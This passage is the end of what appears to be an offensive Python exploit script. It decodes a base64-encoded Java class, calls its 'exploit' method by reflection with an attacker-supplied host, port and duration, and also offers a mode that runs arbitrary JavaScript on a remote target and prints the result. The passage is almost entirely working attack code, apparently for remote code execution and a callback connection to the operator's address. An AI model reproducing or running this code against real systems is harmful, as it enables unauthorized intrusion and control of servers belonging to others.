ADgBcABMAXQBVAAAAKgAEAAAAFABaAFsAAAAAABQASwBMAAEAAAAUAE0ATgACAAAAFABPAFAAAwAJAHkAeAABAFMAAABQAAUAAwAAAA67AD9ZKisstwBAtgBBsQAAAAIAVAAAAAoAAgAAAGAADQBhAFUAAAAgAAMAAAAOAEsATAAAAAAADgBNAE4AAQAAAA4ATwBQAAIACQB6AHsAAQBTAAAAQAAEAAEAAAASEkIRH5C4AEMUAES4AEa4AEexAAAAAgBUAAAACgACAAAAZAARAGUAVQAAAAwAAQAAABIAfAB9AAAAAQB+AAAAAgB/');"
        code += "var exploitMethod = shellClass.getDeclaredMethod('exploit',''.getClass(), java.lang.Class.forName('java.lang.Integer'), java.lang.Class.forName('java.lang.Double'));"
        addr = args.a.split(":",2)
        code += "exploitMethod.invoke(null, '{}', {}, {}*1.0)".format(addr[0],addr[1],args.l)
        res = run_js_code(client, code)
        if res.strip() != "null":
            print("[-] \n{}\n".format(res))
        else:
            print("[+] success")
    else:
        if not args.c or args.c.strip() == "":
            print("[-] Code cannot be empty")
            exit(0)
        res = run_js_code(client, args.c)
        print("[+] Run JS Code Result:\n\n{}\n".format(res))

    client.leave()
